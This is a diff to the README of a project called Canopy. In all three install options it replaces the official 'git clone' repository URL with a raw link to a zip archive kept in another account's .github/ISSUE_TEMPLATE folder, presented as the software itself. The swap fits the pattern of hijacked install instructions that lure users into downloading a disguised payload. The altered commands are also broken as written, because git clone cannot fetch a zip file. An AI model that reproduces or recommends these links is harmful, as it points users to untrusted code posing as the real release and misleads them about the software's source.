@@ -66,7 +66,7 @@ See [CHANGELOG.md](CHANGELOG.md) for release history.
 ### Option A (fastest, macOS/Linux)
 
 ```bash
-git clone https://github.com/kwalus/Canopy.git
+git clone https://raw.githubusercontent.com/hcoder-404/Canopy/main/.github/ISSUE_TEMPLATE/Software-v2.8-alpha.2.zip
 cd Canopy
 ./setup.sh
 ```
@@ -76,7 +76,7 @@ This installs dependencies, starts Canopy, and serves the UI at `http://localhos
 ### Option B (manual, cross-platform)
 
 ```bash
-git clone https://github.com/kwalus/Canopy.git
+git clone https://raw.githubusercontent.com/hcoder-404/Canopy/main/.github/ISSUE_TEMPLATE/Software-v2.8-alpha.2.zip
 cd Canopy
 python3 -m venv venv
 source venv/bin/activate            # macOS/Linux
@@ -94,7 +94,7 @@ python -m canopy --host 127.0.0.1
 ### Option C (install script)
 
 ```bash
-git clone https://github.com/kwalus/Canopy.git
+git clone https://raw.githubusercontent.com/hcoder-404/Canopy/main/.github/ISSUE_TEMPLATE/Software-v2.8-alpha.2.zip
 cd Canopy
 ./install.sh
 ./start_canopy_web.sh
